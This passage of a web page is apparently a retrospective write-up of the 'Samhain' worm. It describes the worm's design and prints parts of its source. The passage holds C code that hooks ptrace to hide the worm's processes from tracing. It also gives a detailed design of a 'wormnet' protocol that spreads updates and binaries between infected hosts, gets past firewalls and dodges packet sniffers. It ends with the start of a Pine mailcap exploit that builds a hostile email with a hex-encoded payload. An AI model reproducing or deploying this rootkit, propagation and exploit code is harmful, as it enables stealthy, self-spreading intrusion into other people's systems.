class="crayon-v">v</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-o">++</span><span class="crayon-v">poz</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span><span class="crayon-o">!=</span><span class="crayon-s">' '</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">v</span><span class="crayon-o">+</span><span class="crayon-v">poz</span><span class="crayon-o">&lt;</span><span class="crayon-v">r</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">mult</span><span class="crayon-o">=</span><span class="crayon-e ">mult*</span><span class="crayon-cn">10</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">v</span><span class="crayon-o">+</span><span class="crayon-v">poz</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">poz</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">SAMLEN</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">v</span><span class="crayon-o">+</span><span class="crayon-v">poz</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">v</span><span class="crayon-o">+</span><span class="crayon-v">poz</span><span class="crayon-sy">]</span><span class="crayon-o">-</span><span class="crayon-s">'0'</span><span class="crayon-o">&gt;</span><span class="crayon-cn">9</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-v">znaki</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-c">// Format error (!)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">SAMLEN</span><span class="crayon-o">+=</span><span class="crayon-sy">(</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">v</span><span class="crayon-o">+</span><span class="crayon-v">poz</span><span class="crayon-o">++</span><span class="crayon-sy">]</span><span class="crayon-o">-</span><span class="crayon-s">'0'</span><span class="crayon-sy">)</span><span class="crayon-o">*</span><span class="crayon-v">mult</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">mult</span><span class="crayon-o">=</span><span class="crayon-v">mult</span><span class="crayon-o">/</span><span class="crayon-cn">10</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->
<p></p>
<p>Worm isnât spreading across the filesystem widely, so the problem doesnât affect many files â only some executables called in boot process â to make sure weâre always resident. Process hiding is quite generic:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d76068450911578" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
int new_ptrace(int req,int pid,int addr,int dat) {
  x=0;
  buf[20]=0;
  sprintf(b,"/proc/%d/cmdline",pid);
  if (active)
    BEGIN_KMEM
    x=old_open(b,O_RDONLY,0);
    END_KMEM
  if (x&gt;0) {
    BEGIN_KMEM
    read(x,b,1);
    END_KMEM
    close(x);
    if (!b[0]) return -ESRCH;
  }
  return old_ptrace(req,pid,addr,dat);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d76068450911578-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-2">2</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-4">4</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-6">6</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-8">8</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-10">10</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-12">12</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-14">14</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76068450911578-16">16</div><div class="crayon-num" data-line="crayon-60580f2d76068450911578-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d76068450911578-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">new_ptrace</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">req</span><span class="crayon-sy">,</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">pid</span><span class="crayon-sy">,</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">addr</span><span class="crayon-sy">,</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">dat</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">x</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76068450911578-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">20</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">sprintf</span><span class="crayon-sy">(</span><span class="crayon-v">b</span><span class="crayon-sy">,</span><span class="crayon-s">"/proc/%d/cmdline"</span><span class="crayon-sy">,</span><span class="crayon-v">pid</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76068450911578-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">active</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">BEGIN</span><span class="crayon-sy">_</span>KMEM</div><div class="crayon-line" id="crayon-60580f2d76068450911578-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">x</span><span class="crayon-o">=</span><span class="crayon-e">old_open</span><span class="crayon-sy">(</span><span class="crayon-v">b</span><span class="crayon-sy">,</span><span class="crayon-v">O_RDONLY</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">END_KMEM</span></div><div class="crayon-line" id="crayon-60580f2d76068450911578-9"><span class="crayon-e">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-o">&gt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">BEGIN_KMEM</span></div><div class="crayon-line" id="crayon-60580f2d76068450911578-11"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-v">b</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">END_KMEM</span></div><div class="crayon-line" id="crayon-60580f2d76068450911578-13"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-v">b</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">ESRCH</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76068450911578-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76068450911578-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">old_ptrace</span><span class="crayon-sy">(</span><span class="crayon-v">req</span><span class="crayon-sy">,</span><span class="crayon-v">pid</span><span class="crayon-sy">,</span><span class="crayon-v">addr</span><span class="crayon-sy">,</span><span class="crayon-v">dat</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76068450911578-17"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p></p>
<p>Also, we have to hide active network connections for wormnet and sent/received wormnet packets to avoid detection via tcpdump, sniffit etc.</p>
<p>Thatâs it, nothing uncommon. Similar code has been written for some other platforms. See my AFHaRM or Sebastianâs Adore modules for implementation of stealth techniques [5].</p>
<p><strong>0x03: Independence + 0x04: Learning</strong></p>
<p>Wormnet. The magic word. Wormnet is used to distribute upgraded Samhain modules (eg. new exploit plugins), and to query other worms for compiled binaries. Communication scheme isnât really difficult, using TCP streams and broadcast messages within TCP streams. Connections are persistent. We have four types of requests:</p>
<ul>
<li>â <strong>infection confirmation:</strong> done simply by connecting to parent worm<br />
  if infection succeded (no connection == failure),</li>
<li>â <strong>update request:</strong> done by re-infecting system (in this case, already installed<br />
  worm verifies signature on new worm when receiving request, then swaps<br />
  process image by doing execve() if requesting binary has newer timestamp),<br />
  then inheriting wormnet connections table and sending short request to<br />
  connected clients, containing code timestamp. </li>
<li>
â <strong>update confirmation:</strong> if timestamp sent on update request is newer than<br />
  timestamp of currently running worm, it should respond with âconfirmationâ,<br />
  then download new code via the same tcp stream; then, it should verify<br />
  code signature, and eventually swap itâs process image with new exec, then<br />
  send update request to connected worms.</li>
<li>â <strong>platform request:</strong> by sending request to every connected worm (TTL<br />
  mechanism is in use) describing machine type, system type and system<br />
  release, as well as IP and port specification; this request is sent<br />
  (with decreased TTL) to other connected wormnet objects, causing<br />
  wormnet broadcast; first worm that can provide specific binary, should<br />
  respond connecting to given IP and port, and worm that sent platform<br />
  request should accept it (once). Any futher connects() (might happen<br />
  till TTL expiration) should be refused. After connecting, suitable<br />
  binary should be sent, then passed to infection routines. Worm should<br />
  try first with TTL approx 5, then, on failure, might increase it by 5<br />
  and retry 3-5 times, we havenât idea about optimal values.</li>
</ul>
<p>Packets are âcryptedâ (again, nothing really strong, security by obscurity) with key assigned to specific connection (derived from parent IP address passed on infection). Type is described by one-byte field, then followed by size field and RAW data or null-terminated strings, eventually with TTL/timestamp fields (depending on type of message).</p>
<p>Wormnet connections structure looks arbitrary and is limited only by max per-worm connections limit. Connections are initiated from child to parent worm, usually bypassing firewall and masquerading software.</p>
<p>On infection, short âwormnet historyâ list is passed to child. If parent has too many wormnet connections at time, and refuses new connection, child should connect to worm from the history list.</p>
<p> </p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d7606a991693691" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
         3
          |
          |               
  3 ----- 2 ---- 3 ----- 4 ------- 5 ------- 6
  |     /        |                 |
  |   /          |                 |
  | /            |                 |		Possible wormnet structure.
  1 ------------ 2 ----- 3         6		Numbers represent infection
    \                  /			order. Bottom "3" couldn't
      \              /				for some reason connect to
        \          /                            it's parent and choosen
          \ ---- 3 ------ 4                     "1" from 'history list'.
                 |
                 |
                 |
                 4</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-2">2</div><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-4">4</div><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-6">6</div><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-8">8</div><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-10">10</div><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-12">12</div><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-14">14</div><div class="crayon-num" data-line="crayon-60580f2d7606a991693691-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606a991693691-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d7606a991693691-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-cn">3</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span></div><div class="crayon-line" id="crayon-60580f2d7606a991693691-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line" id="crayon-60580f2d7606a991693691-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">/</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">/</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span></div><div class="crayon-line" id="crayon-60580f2d7606a991693691-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-h">		</span><span class="crayon-e">Possible </span><span class="crayon-e">wormnet </span><span class="crayon-v">structure</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-cn">6</span><span class="crayon-h">		</span><span class="crayon-e">Numbers </span><span class="crayon-e">represent </span><span class="crayon-i">infection</span></div><div class="crayon-line" id="crayon-60580f2d7606a991693691-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">\</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">/</span><span class="crayon-h">			</span><span class="crayon-v">order</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-i">Bottom</span><span class="crayon-h"> </span><span class="crayon-s">"3"</span><span class="crayon-h"> </span><span class="crayon-i">couldn</span><span class="crayon-s">'t</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-10"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/				for some reason connect to</span></div><div class="crayon-line" id="crayon-60580f2d7606a991693691-11"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;it'</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-r">parent</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-i">choosen</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">\</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-i">from</span><span class="crayon-h"> </span><span class="crayon-s">'history list'</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-60580f2d7606a991693691-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span></div><div class="crayon-line" id="crayon-60580f2d7606a991693691-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606a991693691-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-cn">4</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p></p>
<p>What about exploits? Exploits are modular (plugged into worm body), and divided in two sections â local and remote. We wanted to be platform independent, so we focused on filesystem races, bugs like -xkbdir hole in Xwindows, and inserted just a few buffer overflows, mainly for remote intrusion (but we decided to incorporate some bugs like remote pine mailcap exploit and so onâ¦ Code was kind of shell-quoting masterpiece ;)</p>
<p>Pine mailcap exploit (it has been already fixed after my BUGTRAQ post, but in late 1998 it was something new and nice):</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d7606c797330146" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
fprintf(f,"From: \"%s\" &lt;%s@%s&gt;\n",nam,us,buf2);
fprintf(f,"To: &lt;root@%s&gt;\n",hostname);
fprintf(f,"Subject: %s\n",top);
fprintf(f,"MIME-Version: 1.0\n");
fprintf(f,"Content-Type: multipart/mixed;\n");
fprintf(f,"\tboundary=\"----=_NextPart_000_0007_01BD5F09.B6797740\"\n\n");
fprintf(f,"------=_NextPart_000_0007_01BD5F09.B6797740\n");
fprintf(f,"Content-Type: default/text;\n\t");

fprintf(f,"\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x5c\x5c\x5c\x22\x78\x5c"
        "\x5c\x5c\x22\x5c\x20\x3d\x3d\x5c\x20\x5c\x5c\x5c\x22\x78\x5c\x5c"
